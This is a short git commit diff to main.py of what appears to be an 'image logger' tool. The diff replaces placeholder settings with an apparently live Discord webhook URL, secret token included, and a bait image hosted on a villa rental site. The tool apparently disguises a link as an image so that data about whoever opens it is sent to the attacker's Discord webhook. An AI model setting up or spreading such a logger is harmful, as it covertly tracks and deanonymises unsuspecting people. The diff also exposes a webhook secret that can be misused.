98c76a4551cc8260afbd994af6b5e5cf3773d346
polatkral <murokart762@gmail.com>
2024-06-28 10:21:34 +0000

    Update main.py

--- main.py
+++ main.py
@@ -12,9 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "webhook": "https://discord.com/api/webhooks/1256159193467977801/sSiOku3Syo7Okj4XoRSvASo6eljdV1s5A1vxmEw5KCUdKSZ6J3bymjKboMbiLiH0TyaW",
+    "image": "https://cdn.villaciniz.com.tr/uploads/resim1_f273eb_villa-karatepe-2-villaciniz-4-1600x1067-1_666.jpg", # You can also have a custom image by using a URL argument
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
